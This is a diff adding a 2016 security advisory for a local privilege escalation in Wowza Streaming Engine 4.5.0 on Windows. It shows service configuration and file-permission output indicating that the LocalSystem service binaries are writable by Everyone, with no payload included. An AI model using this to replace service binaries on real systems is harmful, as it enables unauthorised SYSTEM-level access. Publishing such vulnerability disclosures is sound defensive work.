@@ -1,0 +1,84 @@
+﻿Wowza Streaming Engine 4.5.0 Local Privilege Escalation
+
+
+Vendor: Wowza Media Systems, LLC.
+Product web page: https://www.wowza.com
+Affected version: Wowza Streaming Engine 4.5.0 (build 18676)
+                  Wowza Streaming Engine Manager 4.5.0 (build 18676)
+
+Summary: Wowza Streaming Engine is robust, customizable, and scalable
+server software that powers reliable video and audio streaming to any
+device. Learn the benefits of using Wowza Streaming Engine to deliver
+high-quality live and on-demand video content to any device.
+
+Desc: Wowza Streaming Engine suffers from an elevation of privileges
+vulnerability which can be used by a simple authenticated user that
+can change the executable file with a binary of choice. The vulnerability
+exist due to the improper permissions, with the 'F' flag (Full) for
+'Everyone' group. In combination with insecure file permissions the
+application suffers from an unquoted search path issue impacting the
+services 'WowzaStreamingEngine450' and 'WowzaStreamingEngineManager450'
+for Windows deployed as part of Wowza Streaming software.
+
+Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
+           Java Version: 1.8.0_77
+           Java VM Version: 25.77-b03
+           Java Architecture: 64
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5339
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5339.php
+
+
+03.07.2016
+
+--
+
+
+C:\Users\lqwrm>sc qc WowzaStreamingEngineManager450
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: WowzaStreamingEngineManager450
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files (x86)\Wowza Media Systems\Wowza Streaming Engine 4.5.0\manager\bin\nssm_x64.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Wowza Streaming Engine Manager 4.5.0
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+C:\Users\lqwrm>cacls "C:\Program Files (x86)\Wowza Media Systems\Wowza Streaming Engine 4.5.0\manager\bin\nssm_x64.exe"
+C:\Program Files (x86)\Wowza Media Systems\Wowza Streaming Engine 4.5.0\manager\bin\nssm_x64.exe Everyone:(ID)F
+                                                                                                 NT AUTHORITY\SYSTEM:(ID)F
+                                                                                                 BUILTIN\Administrators:(ID)F
+                                                                                                 BUILTIN\Users:(ID)R
+
+==========
+
+C:\Users\lqwrm>sc qc WowzaStreamingEngine450
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: WowzaStreamingEngine450
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START  (DELAYED)
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files (x86)\Wowza Media Systems\Wowza Streaming Engine 4.5.0\bin\nssm_x64.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Wowza Streaming Engine 4.5.0
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+C:\Users\lqwrm>icacls "C:\Program Files (x86)\Wowza Media Systems\Wowza Streaming Engine 4.5.0\bin\nssm_x64.exe"
+C:\Program Files (x86)\Wowza Media Systems\Wowza Streaming Engine 4.5.0\bin\nssm_x64.exe Everyone:(I)(F)
+                                                                                         NT AUTHORITY\SYSTEM:(I)(F)
+                                                                                         BUILTIN\Administrators:(I)(F)
+                                                                                         BUILTIN\Users:(I)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
